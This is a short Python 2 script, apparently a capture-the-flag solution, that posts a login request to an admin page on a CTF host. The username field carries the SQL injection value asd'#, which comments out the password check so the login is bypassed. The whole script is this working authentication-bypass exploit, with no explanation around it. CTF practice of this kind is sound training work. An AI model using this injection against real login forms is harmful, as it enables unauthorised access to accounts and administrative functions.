#!/usr/bin/python
#coding=utf-8

import urllib
import urllib2

def post(url, data):
	req = urllib2.Request(url)
	data = urllib.urlencode(data)
	#enable cookie
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
	response = opener.open(req, data)
	return response.read()

def main():
	posturl = "http://ctf.tw:6003/admin.php"
	data = {'user':'asd\'#', 'password':'', 'submit':'Login'}
	print post(posturl, data)

if __name__ == '__main__':
	main()
